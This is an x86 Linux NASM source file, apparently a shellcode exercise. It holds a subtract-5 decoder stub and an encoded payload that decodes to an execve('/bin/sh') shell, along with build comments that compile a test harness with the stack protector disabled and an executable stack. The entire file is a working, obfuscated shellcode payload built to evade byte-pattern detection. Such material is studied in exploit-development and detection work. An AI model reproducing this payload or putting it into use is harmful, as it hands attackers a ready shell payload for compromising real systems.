; Decode and run /bin/sh - Linux x86 architecture
;  (@_Kiewicz)
; GPL License
;
; python encode.py 
; Copy output to `shellcode` in nasm file
;
; $ nasm -f elf32 decoder.asm -o decoder.o
; $ ld -o decoder decoder.o
; Copy shellcode to shellcode.c file and compile
; $ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode


global _start

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi			; Save shellcode in ESI	
	xor ecx, ecx		; clear out counter
	mov cl, 0x19		; set counter to shellcode length
	xor ebx, ebx		
	mov bl, 0x5		; decode with 5
	xor eax, eax		

decode:
	mov al, byte [esi]	; point to shellcode
	sub al, bl		; substract 5
	mov byte [esi], al	; overwrite in shellcode
	inc esi			; move forward to next byte
	loop decode		; loop until going through the whole shellcode
	jmp short shellcode 	; execute it


call_shellcode:
	call decoder
	shellcode: db 0x36,0xc5,0x55,0x6d,0x34,0x34,0x78,0x6d,0x6d,0x34,0x67,0x6e,0x73,0x8e,0xe8,0x55,0x8e,0xe7,0x58,0x8e,0xe6,0xb5,0x10,0xd2,0x85
